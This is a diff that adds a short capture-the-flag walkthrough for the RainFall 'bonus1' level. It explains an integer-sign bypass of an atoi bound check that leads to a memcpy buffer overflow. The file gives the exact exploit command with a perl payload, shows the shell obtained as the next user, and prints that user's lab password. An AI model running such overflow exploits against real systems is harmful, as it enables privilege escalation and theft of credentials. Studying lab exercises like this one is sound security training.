@@ -1,0 +1,13 @@
+The program checks that atoi(argv[1]) is lower or equal than 9 and stores the value in a variable
+that is used later in memcpy to choose the number of bytes written to the buffer
+
+we need to overwrite esp+0x3c from esp+0x14 (40 bytes)
+argv[2] : `perl -e 'print "A"x40 . "\x46\x4c\x4f\x57"'`
+
+we need to write 44 bytes (40 bytes of buffer and 4 bytes of nbr) but we can't 
+
+bonus1@RainFall:~$ ./bonus1 -1073741813 `perl -e 'print "A"x40 . "\x46\x4c\x4f\x57"'`
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
